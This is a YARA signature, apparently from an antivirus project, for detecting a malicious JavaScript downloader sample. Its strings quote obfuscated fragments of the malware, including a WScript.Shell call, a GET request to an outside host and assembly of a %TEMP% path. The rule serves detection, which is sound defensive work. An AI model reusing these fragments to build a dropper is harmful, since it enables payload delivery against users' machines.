rule sig_20160427_bf0534cf9b92ca40e31e67f2f84d27d2 {
  meta:
    description = "datamaliciousorder - file 20160427_bf0534cf9b92ca40e31e67f2f84d27d2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5e5317f0b1ea74066ad64c5487fced7287839460dcf7006ba92c53d231032f15"

  strings:
    $s1  = "function IdvwjYfosq(VlbhzZfugu, RlyqzJzsmu){VrclnRuckl = VrclnRuckl * 1; return VlbhzZfugu - RlyqzJzsmu;};" fullword ascii
    $s2  = "var IxjxjLdzyf = function LgwktJnfan() {return HrcvuPiaex[XyycsSdqsh](\"WScript\"+\".Shell\");}(), UrvvdIytyo = 11;" fullword ascii
    $s3  = "VgdwzUskdx[QkaneZipof](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s4  = "var HrcvuPiaex = this[\"WScript\"];" fullword ascii
    $s5  = "function WaiqrQohcj() {return IxjxjLdzyf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"DThyUyB" ascii
    $s6  = "function WaiqrQohcj() {return IxjxjLdzyf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"DThyUyB" ascii
    $s7  = "function OpudlUmxiv(){return LxdjwVfxsz + \"\";};" fullword ascii
    $s8  = "if (VgdwzUskdx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function WeeigVtaww() {return ((NjcclFdwhd == true) && (NjcclFdwhd == SofkiCdxmd)) ? 1 : VrclnRuckl;};" fullword ascii
    $s10 = "function OudaaCevlk(){return 23;};" fullword ascii
    $s11 = "return IdvwjYfosq(SfuccSqunl, FittnLddfi);" fullword ascii
    $s12 = "var NjcclFdwhd = false;" fullword ascii
    $s13 = "var HhodeAztfi = false;" fullword ascii
    $s14 = "SofkiCdxmd = true; " fullword ascii
    $s15 = "HhodeAztfi = true;" fullword ascii
    $s16 = "var SofkiCdxmd = false;" fullword ascii
    $s17 = "var CfiolPhvpr = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function YqtfqSbetk(AfsxtAmeja) {var VykfaDgiqi = (1, 2, 3, 4, 5, AfsxtAmeja); return VykfaDgiqi;};" fullword ascii
    $s19 = "NjcclFdwhd = true; " fullword ascii
    $s20 = "}while (NkifvTnyxz);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}